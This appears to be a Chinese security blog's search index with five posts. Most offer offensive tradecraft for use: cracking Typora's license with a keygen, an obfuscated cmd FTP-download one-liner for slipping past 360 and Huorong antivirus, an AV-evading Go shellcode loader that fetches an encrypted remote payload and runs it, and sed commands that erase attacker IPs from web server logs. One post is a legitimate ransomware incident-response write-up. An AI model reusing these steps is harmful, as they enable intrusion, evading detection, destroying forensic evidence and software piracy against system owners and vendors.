<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>typora破解</title>
      <link href="/2021/12/06/eea7c620-5639-11ec-ba3c-61f7f43c2ee5/"/>
      <url>/2021/12/06/eea7c620-5639-11ec-ba3c-61f7f43c2ee5/</url>
      
        <content type="html"><![CDATA[<h2 id="破解用到的工具下载地址"><a href="#破解用到的工具下载地址" class="headerlink" title="破解用到的工具下载地址"></a>破解用到的工具下载地址</h2><p><a href="https://github.com/Mas0nShi/typoraCracker">https://github.com/Mas0nShi/typoraCracker</a></p><h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python typora.py /usr/share/typora/resources/app.asar workstation/outfil</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="https://tc.wuyoukm.top/202112040016501.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="img"></p><h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>​        需要你把typoraCracker\example\patch下的License.js替换刚才生成的在dec_app里面的License.js,然后再进行下面这步python typora.py -u workstation/outfile/dec_app workstation/outappasar</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp License.js /home/ddm/my_tools/typoraCracker-master/workstation/outfile/dec_app</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="https://tc.wuyoukm.top/202112040020458.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"></p><h2 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python typora.py -u workstation/outfile/dec_app workstation/outappasar</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="https://tc.wuyoukm.top/202112040021494.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"></p><h2 id="替换掉app-asar"><a href="#替换掉app-asar" class="headerlink" title="替换掉app.asar"></a>替换掉app.asar</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mv /usr/share/typora/resources/app.asar /usr/share/typora/resources/app.asar.bak</span><br><span class="line">sudo cp app.asar /usr/share/typora/resources/</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="https://tc.wuyoukm.top/202112040023433.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"></p><h2 id="本地生成序列号"><a href="#本地生成序列号" class="headerlink" title="本地生成序列号"></a>本地生成序列号</h2><p>node keygen.js</p><p><img "" class="lazyload placeholder" data-original="https://tc.wuyoukm.top/202112040024488.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"></p><h2 id="激活成功"><a href="#激活成功" class="headerlink" title="激活成功"></a>激活成功</h2><p>邮箱：<a href="mailto:&#x63;&#114;&#97;&#99;&#107;&#64;&#101;&#120;&#x61;&#x6d;&#112;&#108;&#101;&#46;&#99;&#x6e;">&#x63;&#114;&#97;&#99;&#107;&#64;&#101;&#120;&#x61;&#x6d;&#112;&#108;&#101;&#46;&#99;&#x6e;</a></p><p>序列号：本地生成的那个</p>]]></content>
      
      
      <categories>
          
          <category> 破解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 破解 </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>360安全大脑+火绒环境下的cmd下载绕过</title>
      <link href="/2021/05/26/c50063a0-12f4-11ec-bb63-2dbf0d91096c/"/>
      <url>/2021/05/26/c50063a0-12f4-11ec-bb63-2dbf0d91096c/</url>
      
        <content type="html"><![CDATA[<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><span id="more"></span><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> open 192.168.30.104 21&gt;x.txt&amp;echo.123\&gt;&gt;x.txt&amp;echo.123\&gt;&gt;x.txt&amp;<span class="built_in">echo</span> get 123.txt&gt;&gt;x.txt&amp;<span class="built_in">echo</span> <span class="built_in">bye</span>&gt;&gt;x.txt  ​  </span><br><span class="line"><span class="built_in">set</span> demo=<span class="string">&quot;f&quot;</span>T<span class="string">&quot;p&quot;</span> -s<span class="string">&quot; 12312312312312312  ​  </span></span><br><span class="line"><span class="string">%demo:~0,11%:x.txt</span></span><br></pre></td></tr></table></figure><p>第一个123是账号，第二个123是密码，123.txt是要下载的文件，如果要下载exe建议，改成txt然后rename</p><p><img "" class="lazyload placeholder" data-original="https://tc.wuyoukm.top/2021-05-26-rBuJfR.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"></p>]]></content>
      
      
      <categories>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记某次勒索应急响应处理过程</title>
      <link href="/2021/05/13/c5008ab1-12f4-11ec-bb63-2dbf0d91096c/"/>
      <url>/2021/05/13/c5008ab1-12f4-11ec-bb63-2dbf0d91096c/</url>
      
        <content type="html"><![CDATA[<p><strong>今天8点多，DDM还在睡梦中，好家伙就看到用户钉钉给DDM发信息了，DDM头疼啊，这个用户DDM真的怕，啥也不会，只会找DDM，DDM只是个卑微的打工仔，敢怒不敢言，于是就有这篇文章(已脱敏处理)</strong></p><span id="more"></span><h2 id="应急排查"><a href="#应急排查" class="headerlink" title="应急排查"></a>应急排查</h2><p><strong>到现场开始排查，看了一下ip，暂且叫105把，看了一下勒索信，以及后缀devos</strong></p><p><img "" class="lazyload placeholder" data-original="https://tc.wuyoukm.top/2021-05-13-S2waU7.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"></p><p><strong>DDM印象中是无解的，拿去奇安信官网查询了一波，也是无解的</strong></p><p><img "" class="lazyload placeholder" data-original="https://tc.wuyoukm.top/2021-05-13-pGClBl.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"></p><p><strong>没办法解密咋整呢？如果有备份就恢复备份，没备份就交钱呗，没钱业务也不重要就直接重装，但是能溯源还是溯源一下，起码知道是怎么中招的，所以咱们看看被勒索的时间，因为根据时间线排查范围大大缩小排查就很方便了</strong></p><p><img "" class="lazyload placeholder" data-original="https://tc.wuyoukm.top/2021-05-13-SVe6XJ.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"></p><p><strong>现在知道了被勒索的时间是2021年5月13号，那在看看日志把，看日志主要看事件ID为4624(具体情况具体看待，如果有域控的话是其他事件ID了)登录类型为10的安全日志</strong></p><p><img "" class="lazyload placeholder" data-original="https://tc.wuyoukm.top/2021-05-13-SbRYtd.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210513191745192"></p><p><strong>好家伙不止一台，赶紧联系甲方爸爸，让他协商让DDM进164这台服务器一探究竟，因为这台百分之99.99也被加密了，进164这台服务器之后,好家伙，意料之中，也被加密了</strong></p><p><img "" class="lazyload placeholder" data-original="https://tc.wuyoukm.top/2021-05-13-lqaXLj.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"></p><p><strong>一看就是同一个人，老规矩接着看勒索加密时间</strong></p><p><img "" class="lazyload placeholder" data-original="https://tc.wuyoukm.top/2021-05-13-ZLHlMS.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"></p><p><strong>在接着去看日志</strong></p><p><img "" class="lazyload placeholder" data-original="https://tc.wuyoukm.top/2021-05-13-CVBxGF.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"></p><p><strong>终于被DDM逮住了，这个122.186.14.34拿去微步上看一下</strong></p><p><img "" class="lazyload placeholder" data-original="https://tc.wuyoukm.top/2021-05-13-GI2gRa.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"></p><p><strong>就是这个家伙了，但是这个时候用户和DDM说，165也被加密了，那在去看看165啥情况吧</strong></p><p><img "" class="lazyload placeholder" data-original="https://tc.wuyoukm.top/2021-05-13-lGuUOH.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210513192853287"></p><p><strong>还是同一个人接着去看被勒索时间</strong></p><p><img "" class="lazyload placeholder" data-original="https://tc.wuyoukm.top/2021-05-13-sbFKog.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"></p><p><strong>接着去看日志</strong></p><p><img "" class="lazyload placeholder" data-original="https://tc.wuyoukm.top/2021-05-13-bhW4Z1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210513193000059"></p><p><strong>这里就令DDM很诧异了，一串暴力破解但是突然注销？这太诡异了吧，后来经过搜索，在先知社区中的<a href="https://xz.aliyun.com/t/2524">一篇文章</a>看到RDP相关日志</strong></p><p><img "" class="lazyload placeholder" data-original="https://tc.wuyoukm.top/2021-05-13-GKW44T.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210513193545562"></p><p><strong>于是去翻了一下日志，真的找到了</strong></p><p><img "" class="lazyload placeholder" data-original="https://tc.wuyoukm.top/2021-05-13-UXfqLq.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210513193608786"></p><p><strong>好家伙还是从164进来的，由于DDM疏忽了，没注意去核对164的RDP日志的21事件ID，所以DDM推测应该是164上原本就连接着165机器，一直没关掉，导致黑客可以直接加密165了，也能解释为什么安全日志里面只有注销没有登录事件了</strong></p><h2 id="应急小结"><a href="#应急小结" class="headerlink" title="应急小结"></a>应急小结</h2><p><strong>后来询问用户164的RDP密码是多少的时候,直接把DDM惊呆了，居然是QWEqwe123，虽说有大小写有数字，但这…还是弱口令，而且安全意识不到把RDP放到公网上去了，这不等着给人勒索嘛</strong></p><p><strong>现在来理一下黑客的整个过程</strong></p><p><strong>黑客通过境外IP122.186.14.34对164发起RDP暴力破解攻击，最后爆破出密码为QWE123123，爆破出密码后于2021年5月12号23.44分登陆164，看到164上有165的RDP连接，于是在2021年5月13号2点45分对165进行加密，黑客又通过164对105发去暴力破解，于2021年5月13号5.18分对105进行勒索，最后在2021年5月13号5点45分对164进行勒索，勒索完毕后退出。</strong></p><h2 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h2><p><strong>其实到这里溯源工作已经做完了，但是DDM很想逆向一下，但是又没那个本事，于是拿着样本去微步和奇安信沙箱run了一下</strong></p><p><strong>截图就不放了，直接放检测结果：<a href="https://sandbox.ti.qianxin.com/sandbox/page/detail?type=file&id=AXlj12IXxyHYZ1u3Gxzu">奇安信</a>/<a href="https://s.threatbook.cn/report/file/ffd005db0aacaf27786c0dc1c14c5d6f72add73295ef98365c48eaba43200a92/?env=win7_sp1_enx64_office2013">微步</a></strong></p><p><strong>说巧不巧，这个用户还问DDM要勒索病毒分析报告，DDM哪会写什么病毒分析报告，于是这两个检测结果甩给用户了，DDM真是机智</strong></p><p><strong>欢迎大佬们逆向分析这个勒索，DDM表示很想学习一下</strong></p>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 勒索 </tag>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>golang的shellcode加载器(免杀)</title>
      <link href="/2021/05/13/c5008ab0-12f4-11ec-bb63-2dbf0d91096c/"/>
      <url>/2021/05/13/c5008ab0-12f4-11ec-bb63-2dbf0d91096c/</url>
      
        <content type="html"><![CDATA[<p>生成python的shellcode</p><span id="more"></span><p><img "" class="lazyload placeholder" data-original="https://tc.wuyoukm.top/2021-05-13-kKXoSw.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="img"></p><p>生成的payload如下</p><p><img "" class="lazyload placeholder" data-original="https://tc.wuyoukm.top/2021-05-13-u79LhG.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="img"></p><p>把payload放到go_shellcode_encode.py</p><p><img "" class="lazyload placeholder" data-original="https://tc.wuyoukm.top/2021-05-13-uXMeuz.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="img"></p><p>将生产的字符串放到txt中</p><p><img "" class="lazyload placeholder" data-original="https://tc.wuyoukm.top/2021-05-13-0voDPX.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="img"></p><p>将txt文件上传至腾讯云oss上,并修改oss权限</p><p><img "" class="lazyload placeholder" data-original="https://tc.wuyoukm.top/2021-05-13-8PObRL.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="img"></p><p>复制临时链接</p><p><img "" class="lazyload placeholder" data-original="https://tc.wuyoukm.top/2021-05-13-Gm0wx4.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="img"></p><p>将复制来的临时链接放到url_encryption.go，加密url</p><p><img "" class="lazyload placeholder" data-original="https://tc.wuyoukm.top/2021-05-13-R1rsTL.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="img"></p><p>把空格替换成,</p><p><img "" class="lazyload placeholder" data-original="https://tc.wuyoukm.top/2021-05-13-Zp7kcN.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="img"></p><p>在把这个数据替换掉demo.go vurl参数的值</p><p><img "" class="lazyload placeholder" data-original="https://tc.wuyoukm.top/2021-05-13-HTSA9i.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="img"></p><p>生成exe GOOS=windows GOARCH=amd64 go build -ldflags “-H windowsgui” demo.go</p><p><img "" class="lazyload placeholder" data-original="https://tc.wuyoukm.top/2021-05-13-v5TObc.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="img"></p><p>执行即可上线</p><p><img "" class="lazyload placeholder" data-original="https://tc.wuyoukm.top/2021-05-13-1dIjt6.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>团队学习计划week1</title>
      <link href="/2021/05/07/c5008ab2-12f4-11ec-bb63-2dbf0d91096c/"/>
      <url>/2021/05/07/c5008ab2-12f4-11ec-bb63-2dbf0d91096c/</url>
      
        <content type="html"><![CDATA[<p> <img "" class="lazyload placeholder" data-original="http://tc.wuyoukm.top/2021-05-07-eyichp.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"></p><p>记录一下团队学习的内容</p><span id="more"></span><h2 id="web服务器日志"><a href="#web服务器日志" class="headerlink" title="web服务器日志"></a>web服务器日志</h2><h3 id="iis"><a href="#iis" class="headerlink" title="iis"></a>iis</h3><p>默认在C:\inetpub\logs\LogFiles\W3SVC1(W3SVC2，W3SVC3)[文件名格式为u_ex年月日] 宝塔下在BtSoft\wwwlogs\W3SVC1(W3SVC2，W3SVC3)[文件名格式为u_ex年月日] <img "" class="lazyload placeholder" data-original="http://tc.wuyoukm.top/2021-05-07-kguKov.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image.png"> user-agent前是访问的IP，清除日志的时候替换掉这个IP或者和这个IP有关的删除即可</p><h3 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h3><p>ubuntu默认在/var/log/apache2 /access.log 宝塔默认在./BtSoft/apache/logs/access.log <img "" class="lazyload placeholder" data-original="http://tc.wuyoukm.top/2021-05-07-EpVDgz.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image.png"> 清除日志的话把404的日志删除或者 404的客户端访问IP给替换掉</p><h3 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h3><p>ubuntu默认在/var/log/nginx /access.log 宝塔默认在BtSoft\wwwlogs\ip.log <img "" class="lazyload placeholder" data-original="http://tc.wuyoukm.top/2021-05-07-JwpNZl.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image.png"> 清除日志的话把404的日志删除或者 404的客户端访问IP给替换掉</p><h2 id="日志清理"><a href="#日志清理" class="headerlink" title="日志清理"></a>日志清理</h2><p>1.ip替换</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> sed \-i <span class="string">&#x27;s/192.168.1.36/192.168.2.2/g&#x27;</span> access.log</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="http://tc.wuyoukm.top/2021-05-07-mrqSmF.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image.png"> 2.清除相关日志</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> sed \-i \-e <span class="string">&#x27;/ 404 /d&#x27;</span> access.log</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="http://tc.wuyoukm.top/2021-05-07-1t64JY.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 团队学习计划 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
